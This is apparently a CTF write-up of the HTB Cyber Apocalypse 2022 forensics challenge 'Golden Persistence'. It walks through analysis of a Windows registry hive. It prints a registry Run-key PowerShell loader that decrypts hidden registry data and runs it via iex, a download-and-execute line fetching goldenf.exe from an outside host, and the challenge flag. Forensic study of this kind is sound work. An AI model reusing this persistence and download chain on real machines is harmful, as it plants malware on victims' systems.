---
title: "HTB Cyber Apocalypse CTF 2022"
categories: [Writeups]
layout: post 
---

# HTB Cyber Apoclypse CTF 2022 Writeups

## Team Placing: #99 / 7024

![](/assets/img/writeups/HTBCyberApocalypse2022/certificate.jpg)

## Categories
* ### Forensics
    * #### [Golden Persistence](#challenge-golden-persistence)

-------------------------------------------------------------------------------

### Challenge: Golden Persistence
### Category: Forensics

## Description:

![](/assets/img/writeups/HTBCyberApocalypse2022/forensics_golden_persistence.png)

## Walkthrough:

We're provided a `NTUSER.DAT` file which contains the `HKEY_CURRENT_USER` registry hive in Windows. Based off the challenge title and description, we know we're looking for some persistence within the registry. One of the most common mechanisms for persistence within the registry is by using the `Run` registry key which is used to run a program every time a user logs on.

So we can use a tool from Eric Zimmerman called [Registry Explorer](https://ericzimmerman.github.io/#!index.md) to easily view the registry hive mentioned before. The `Run` registry key is located in `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run` so let's check that out first:

![](/assets/img/writeups/HTBCyberApocalypse2022/Golden%20Persistence%20Writeup.001.png)

We can quickly see that there is a PowerShell payload which appears to be Base64 encoded. We can use CyberChef to quickly decode this and save to a file called `stage2.ps1`:
```powershell
function encr {
    param(
        [Byte[]]$data,
        [Byte[]]$key
      )
 
    [Byte[]]$buffer = New-Object Byte[] $data.Length
    $data.CopyTo($buffer, 0)
    
    [Byte[]]$s = New-Object Byte[] 256;
    [Byte[]]$k = New-Object Byte[] 256;
 
    for ($i = 0; $i -lt 256; $i++)
    {
        $s[$i] = [Byte]$i;
        $k[$i] = $key[$i % $key.Length];
    }
 
    $j = 0;
    for ($i = 0; $i -lt 256; $i++)
    {
        $j = ($j + $s[$i] + $k[$i]) % 256;
        $temp = $s[$i];
        $s[$i] = $s[$j];
        $s[$j] = $temp;
    }
 
    $i = $j = 0;
    for ($x = 0; $x -lt $buffer.Length; $x++)
    {
        $i = ($i + 1) % 256;
        $j = ($j + $s[$i]) % 256;
        $temp = $s[$i];
        $s[$i] = $s[$j];
        $s[$j] = $temp;
        [int]$t = ($s[$i] + $s[$j]) % 256;
        $buffer[$x] = $buffer[$x] -bxor $s[$t];
    }
 
    return $buffer
}


function HexToBin {
    param(
    [Parameter(
        Position=0, 
        Mandatory=$true, 
        ValueFromPipeline=$true)
    ]   
    [string]$s)
    $return = @()
    
    for ($i = 0; $i -lt $s.Length ; $i += 2)
    {
        $return += [Byte]::Parse($s.Substring($i, 2), [System.Globalization.NumberStyles]::HexNumber)
    }
    
    Write-Output $return
}

[Byte[]]$key = $enc.GetBytes("Q0mmpr4B5rvZi3pS")
$encrypted1 = (Get-ItemProperty -Path HKCU:\SOFTWARE\ZYb78P4s).t3RBka5tL
$encrypted2 = (Get-ItemProperty -Path HKCU:\SOFTWARE\BjqAtIen).uLltjjW
$encrypted3 = (Get-ItemProperty -Path HKCU:\SOFTWARE\AppDataLow\t03A1Stq).uY4S39Da
$encrypted4 = (Get-ItemProperty -Path HKCU:\SOFTWARE\Google\Nv50zeG).Kb19fyhl
$encrypted5 = (Get-ItemProperty -Path HKCU:\AppEvents\Jx66ZG0O).jH54NW8C
$encrypted = "$($encrypted1)$($encrypted2)$($encrypted3)$($encrypted4)$($encrypted5)"
$enc = [System.Text.Encoding]::ASCII
[Byte[]]$data = HexToBin $encrypted
$DecryptedBytes = encr $data $key
$DecryptedString = $enc.GetString($DecryptedBytes)
$DecryptedString|iex
```

To summarize the script, it grabs the values within other registry keys in the hive and concatenates them:
```powershell
$encrypted1 = (Get-ItemProperty -Path HKCU:\SOFTWARE\ZYb78P4s).t3RBka5tL
$encrypted2 = (Get-ItemProperty -Path HKCU:\SOFTWARE\BjqAtIen).uLltjjW
$encrypted3 = (Get-ItemProperty -Path HKCU:\SOFTWARE\AppDataLow\t03A1Stq).uY4S39Da
$encrypted4 = (Get-ItemProperty -Path HKCU:\SOFTWARE\Google\Nv50zeG).Kb19fyhl
$encrypted5 = (Get-ItemProperty -Path HKCU:\AppEvents\Jx66ZG0O).jH54NW8C
$encrypted = "$($encrypted1)$($encrypted2)$($encrypted3)$($encrypted4)$($encrypted5)"
```

It then hex decodes these strings using the defined `HexToBin` function:
```powershell
[Byte[]]$data = HexToBin $encrypted
```

Finally, it decrypts these bytes using the defined `encr` function and executes the decrypted string using `iex` [(Invoke-Expression)](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2)

```powershell
$DecryptedBytes = encr $data $key
$DecryptedString = $enc.GetString($DecryptedBytes)
$DecryptedString|iex
```

Now that we have an idea of what is occurring, let's grab those hex strings I mentioned from the registry. Registry Explorer has a handy search feature which makes this easy:

![](/assets/img/writeups/HTBCyberApocalypse2022/Golden%20Persistence%20Writeup.002.png)

After grabbing the hex strings, now we can just make the script work for us by replacing the encrypted variables with the correct hex string and ensuring we comment out the `iex` so we do not actually execute the potentially malicious payload:

```powershell
# $encrypted1 = (Get-ItemProperty -Path HKCU:\SOFTWARE\ZYb78P4s).t3RBka5tL
$encrypted1 = "F844A6035CF27CC4C90DFEAF579398BE6F7D5ED10270BD12A661DAD04191347559B82ED546015B07317000D8909939A4DA7953AED8B83C0FEE4EB6E120372F536BC5DC39"
#$encrypted2 = (Get-ItemProperty -Path HKCU:\SOFTWARE\BjqAtIen).uLltjjW
$encrypted2 = "CC19F66A5F3B2E36C9B810FE7CC4D9CE342E8E00138A4F7F5CDD9EED9E09299DD7C6933CF4734E12A906FD9CE1CA57D445DB9CABF850529F5845083F34BA1"
#$encrypted3 = (Get-ItemProperty -Path HKCU:\SOFTWARE\AppDataLow\t03A1Stq).uY4S39Da
$encrypted3 = "C08114AA67EB979D36DC3EFA0F62086B947F672BD8F966305A98EF93AA39076C3726B0EDEBFA10811A15F1CF1BEFC78AFC5E08AD8CACDB323F44B4D"
#$encrypted4 = (Get-ItemProperty -Path HKCU:\SOFTWARE\Google\Nv50zeG).Kb19fyhl
$encrypted4 = "D814EB4E244A153AF8FAA1121A5CCFD0FEAC8DD96A9B31CCF6C3E3E03C1E93626DF5B3E0B141467116CC08F92147F7A0BE0D95B0172A7F34922D6C236BC7DE54D8ACBFA70D1"
#$encrypted5 = (Get-ItemProperty -Path HKCU:\AppEvents\Jx66ZG0O).jH54NW8C
$encrypted5 = "84AB553E67C743BE696A0AC80C16E2B354C2AE7918EE08A0A3887875C83E44ACA7393F1C579EE41BCB7D336CAF8695266839907F47775F89C1F170562A6B0A01C0F3BC4CB"
$encrypted = "$($encrypted1)$($encrypted2)$($encrypted3)$($encrypted4)$($encrypted5)"
$enc = [System.Text.Encoding]::ASCII
[Byte[]]$data = HexToBin $encrypted
$DecryptedBytes = encr $data $key
$DecryptedString = $enc.GetString($DecryptedBytes)
$DecryptedString#|iex
```

Running the `stage2.ps1` script, we get even more PowerShell code:

```powershell
$path ="C:\ProgramData\windows\goldenf.exe";$exists = Test-Path -Path $path -PathType Leaf;if ( $exists ){Start-Process $path}else{mkdir "C:\ProgramData\windows";Invoke-WebRequest -Uri https://thoccarthmercenaries.edu.tho/wp-content/goldenf.exe -OutFile $path;$flag="HTB{g0ld3n_F4ng_1s_n0t_st34lthy_3n0ugh}";Start-Process $path}
```

And here it is cleaned up a bit:

```powershell
$path ="C:\ProgramData\windows\goldenf.exe";
$exists = Test-Path -Path $path -PathType Leaf;
if ( $exists ){
    Start-Process $path
}else{
    mkdir "C:\ProgramData\windows";
    Invoke-WebRequest -Uri https://thoccarthmercenaries.edu.tho/wp-content/goldenf.exe -OutFile $path;
    $flag="HTB{g0ld3n_F4ng_1s_n0t_st34lthy_3n0ugh}";
    Start-Process $path
}
```

We can see the script checks to see if `goldenf.exe` exists at the specified path, if it does it will simply execute- otherwise it will download the executable and then execute. 

And there's also our flag!

### Flag: HTB{g0ld3n_F4ng_1s_n0t_st34lthy_3n0ugh}